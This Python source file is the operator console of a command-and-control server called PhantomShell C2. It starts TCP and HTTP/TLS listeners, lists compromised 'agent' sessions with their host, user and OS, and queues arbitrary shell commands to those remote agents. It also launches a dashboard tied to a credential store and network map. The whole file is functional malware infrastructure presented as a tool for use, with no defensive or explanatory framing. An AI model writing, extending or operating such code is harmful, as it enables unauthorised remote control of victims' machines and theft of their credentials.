#!/usr/bin/env python3
"""PhantomShell C2 Server — Multi-session command and control."""

import cmd
import json
import logging
import sys
import time

from listeners.tcp_listener import TcpListener
from listeners.http_listener import HttpListener
from handlers.session import SessionManager
from handlers.credential_store import CredentialStore
from handlers.network_map import NetworkMap

logging.basicConfig(
    level=logging.INFO,
    format="%(message)s",
)
log = logging.getLogger("phantom.c2")

BANNER = r"""
    ____  __                 __                 _____ __         ____
   / __ \/ /_  ____ _____  / /_____  ____ ___ / ___// /_  ___  / / /
  / /_/ / __ \/ __ `/ __ \/ __/ __ \/ __ `__ \\__ \/ __ \/ _ \/ / /
 / ____/ / / / /_/ / / / / /_/ /_/ / / / / / /__/ / / / /  __/ / /
/_/   /_/ /_/\__,_/_/ /_/\__/\____/_/ /_/ /_/____/_/ /_/\___/_/_/
                                                        C2 v5.2
"""


class PhantomC2(cmd.Cmd):
    """Interactive C2 command interface."""

    prompt = "\033[1;31mPhantomC2\033[0m > "

    def __init__(self):
        super().__init__()
        self.sessions = SessionManager()
        self.listeners: dict[str, TcpListener | HttpListener] = {}
        self._interacting: str | None = None
        self.credential_store = CredentialStore()
        self.network_map = NetworkMap()
        self._api_thread = None

    def preloop(self):
        print(BANNER)
        print("[*] Type 'help' for available commands")
        print()

    def do_listen(self, args):
        """Start a TCP listener: listen [port] [host]"""
        parts = args.split()
        port = int(parts[0]) if parts else 4444
        host = parts[1] if len(parts) > 1 else "0.0.0.0"
        key = f"{host}:{port}"

        if key in self.listeners:
            print(f"[-] Listener already running on {key}")
            return

        listener = TcpListener(host=host, port=port, session_manager=self.sessions)
        listener.start()
        self.listeners[key] = listener
        print(f"[+] TCP listener started on {key}")

    def do_listen_http(self, args):
        """Start an HTTP listener: listen_http [port] [host] [--tls certfile keyfile]"""
        parts = args.split()
        port = int(parts[0]) if parts else 8443
        host = parts[1] if len(parts) > 1 and not parts[1].startswith("--") else "0.0.0.0"

        use_tls = False
        certfile = None
        keyfile = None
        if "--tls" in parts:
            idx = parts.index("--tls")
            use_tls = True
            if idx + 2 < len(parts):
                certfile = parts[idx + 1]
                keyfile = parts[idx + 2]
            else:
                print("[-] --tls requires certfile and keyfile")
                return

        key = f"http://{host}:{port}"
        if key in self.listeners:
            print(f"[-] Listener already running on {key}")
            return

        listener = HttpListener(
            host=host, port=port, session_manager=self.sessions,
            use_tls=use_tls, certfile=certfile, keyfile=keyfile,
        )
        listener.start()
        self.listeners[key] = listener
        proto = "HTTPS" if use_tls else "HTTP"
        print(f"[+] {proto} listener started on {host}:{port}")

    def do_listeners(self, _):
        """List active listeners"""
        if not self.listeners:
            print("[*] No active listeners")
            return
        print(f"\n {'ID':<20} {'Status':<10}")
        print("-" * 32)
        for key in self.listeners:
            print(f" {key:<20} {'active':<10}")
        print()

    def do_sessions(self, _):
        """List all agent sessions"""
        sessions = self.sessions.list_sessions()
        if not sessions:
            print("[*] No active sessions")
            return
        print(f"\n {'ID':<14} {'Agent':<14} {'Host':<22} {'User':<12} {'OS':<8} {'Type':<8} {'Alive':<6} {'Last':<6} {'Tasks':<5}")
        print("-" * 100)
        for s in sessions:
            alive = "\033[32mYes\033[0m" if s["alive"] else "\033[31mNo\033[0m"
            print(f" {s['session_id']:<14} {s['agent_id']:<14} {s['hostname']+'@'+s['addr']:<22} "
                  f"{s['username']:<12} {s['os']:<8} {s['agent_type']:<8} {alive:<15} {s['last_beacon']:<6} {s['pending_tasks']:<5}")
        print()

    def do_interact(self, session_id):
        """Interact with a session: interact <session_id>"""
        if not session_id:
            print("[-] Usage: interact <session_id>")
            return
        if not self.sessions.set_active(session_id):
            print(f"[-] Session not found: {session_id}")
            return
        self._interacting = session_id
        session = self.sessions.get_session(session_id)
        info = session.info
        print(f"\n[+] Interacting with {session_id}")
        print(f"    Host: {info.get('hostname', '?')}")
        print(f"    User: {info.get('username', '?')}")
        print(f"    OS: {info.get('os', '?')} {info.get('os_version', '')}")
        print(f"    Agent: {info.get('agent_type', '?')} v{info.get('agent_version', '?')}")
        print(f"\n[*] Type commands to execute. 'back' to return.\n")

        old_prompt = self.prompt
        self.prompt = f"\033[1;31mPhantomC2\033[0m(\033[1;33m{session_id}\033[0m) > "

        while True:
            try:
                user_input = input(self.prompt).strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break

            if not user_input:
                continue
            if user_input == "back":
                break
            if user_input == "responses":
                responses = self.sessions.get_responses(session_id)
                for r in responses:
                    print(f"\n[Task: {r.get('task_id', '?')}] Status: {r.get('status', '?')}")
                    if r.get("output"):
                        print(r["output"])
                    if r.get("error"):
                        print(f"\033[31m{r['error']}\033[0m")
                    if r.get("data"):
                        print(json.dumps(r["data"], indent=2))
                if not responses:
                    print("[*] No new responses")
                continue

            parts = user_input.split(None, 1)
            command = parts[0]
            raw = parts[1] if len(parts) > 1 else None

            task_id = self.sessions.queue_task(session_id, command, raw=user_input)
            if task_id:
                print(f"[*] Task queued: {task_id}")
            else:
                print("[-] Failed to queue task")

        self.prompt = old_prompt
        self._interacting = None

    def do_kill(self, session_id):
        """Send exit command to session: kill <session_id>"""
        if not session_id:
            print("[-] Usage: kill <session_id>")
            return
        task_id = self.sessions.queue_task(session_id, "exit")
        if task_id:
            print(f"[+] Exit command queued for {session_id}")
        else:
            print(f"[-] Session not found: {session_id}")

    def do_stop(self, args):
        """Stop a listener: stop <host:port>"""
        if not args:
            print("[-] Usage: stop <host:port>")
            return
        if args in self.listeners:
            self.listeners[args].stop()
            del self.listeners[args]
            print(f"[+] Listener stopped: {args}")
        else:
            print(f"[-] Listener not found: {args}")

    def do_dashboard(self, args):
        """Start the web dashboard API server: dashboard [port]"""
        if self._api_thread and self._api_thread.is_alive():
            print("[-] Dashboard is already running")
            return

        parts = args.split()
        port = int(parts[0]) if parts else 5000
        host = parts[1] if len(parts) > 1 else "0.0.0.0"

        from api import start_api_server
        self._api_thread = start_api_server(
            session_manager=self.sessions,
            listeners=self.listeners,
            host=host,
            port=port,
            credential_store=self.credential_store,
            network_map_inst=self.network_map,
        )
        print(f"[+] Dashboard started on http://{host}:{port}")

    def do_exit(self, _):
        """Exit PhantomShell C2"""
        for listener in self.listeners.values():
            listener.stop()
        print("[*] Shutting down...")
        return True

    do_quit = do_exit

    def default(self, line):
        if self._interacting:
            task_id = self.sessions.queue_task(self._interacting, "shell", raw=line)
            if task_id:
                print(f"[*] Task queued: {task_id}")
        else:
            print(f"[-] Unknown command: {line}")

    def emptyline(self):
        pass


def main():
    try:
        c2 = PhantomC2()
        c2.cmdloop()
    except KeyboardInterrupt:
        print("\n[*] Interrupted, shutting down...")


if __name__ == "__main__":
    main()
